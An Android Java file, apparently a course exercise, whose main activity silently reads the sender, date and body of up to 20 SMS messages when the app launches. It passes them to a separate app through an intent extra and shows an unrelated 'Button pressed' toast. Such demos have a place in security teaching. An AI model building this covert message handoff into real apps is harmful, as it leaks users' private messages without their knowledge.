package com.example.mnit.task27;

import android.Manifest;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import java.io.Serializable;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Objects;

public class MainActivity extends AppCompatActivity {


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        final String sb=getmsgdetails();
        ComponentName name = new ComponentName("com.example.mnit.activity27", "com.example.mnit.activity27.MainActivity");
        Intent abc = new Intent();
        abc.setComponent(name);
        abc.setAction(Intent.ACTION_MAIN);
        abc.addCategory(Intent.CATEGORY_LAUNCHER);
        abc.putExtra("destination", (Serializable) sb);
        startActivity(abc);
        Toast.makeText(getApplicationContext(), "Button pressed", Toast.LENGTH_SHORT).show();

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }
    private String getmsgdetails() {
        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
        String msgData="";
        int h=0;
        if (cursor.moveToFirst()) { // must check the result to prevent exception
            do {

                for (int idx = 0; idx < cursor.getColumnCount(); idx++) {
                    String column=cursor.getColumnName(idx);
                    if(column.equals("address")){
                        msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx);
                    msgData+="\n";}
                    if(column.equals("date")){
                        Date date = new Date(cursor.getLong(4));
                        String formattedDate = new SimpleDateFormat("MM/dd/yyyy").format(date);
                        msgData +=cursor.getColumnName(idx) + ":" + formattedDate;
                        msgData+="\n";
                        }
                    if(column.equals("body")){
                        msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx);
                        msgData+="\n";}
                }


                msgData+="\n";
                h++;

                // use msgData
            } while (cursor.moveToNext()&&h!=20);
        } else {
            // empty box, no SMS
        }
        return msgData;
    } }